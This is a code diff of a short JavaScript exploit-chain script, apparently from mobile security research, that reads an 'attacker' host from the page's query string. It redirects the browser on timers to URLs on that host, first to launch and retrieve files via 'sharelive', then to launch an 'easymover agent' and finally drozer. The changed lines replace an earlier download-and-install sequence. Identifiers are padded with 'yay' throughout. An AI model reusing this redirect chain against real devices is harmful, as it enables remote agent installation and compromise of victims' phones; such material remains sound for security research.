@@ -4,15 +4,22 @@ var yayquerystringyay = window.location.search;
 var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
 var yaypythonserveryay = yayurlparamsyay.get('yayattackeryay');
 
-location.href = "http://" + yaypythonserveryay + "/yaydownloadyay";
+//open sharelive to start awareservice 
+location.href = "http://" + yaypythonserveryay + "/yaylaunchshareliveyay";
+const yayshorttimoutyay=setTimeout(yaystartyay,2000);
 
-const yaytimoutyay=setTimeout(yayinstallyay,50000);
-
-function yayinstallyay(){
-    location.href = "http://" + yaypythonserveryay + "/yayinstallyay";
-    const yaytimoutyay2=setTimeout(yaylaunchyay,50000);
+//open sharelive and retrieve file
+function yaystartyay(){
+    location.href = "http://" + yaypythonserveryay + "/yayshareliveyay";
 }
+const yaytimoutyay2=setTimeout(yayfinalyay,15000);
 
+//redirect to launch easymover agent
+function yayfinalyay(){
+    location.href = "http://" + yaypythonserveryay + "/yayfinalyay";
+    const yaytimoutyay3=setTimeout(yaylaunchyay,15000);
+}
+//launch drozer
 function yaylaunchyay(){
 location.href = "http://" + yaypythonserveryay + "/yaylaunchyay";
 }
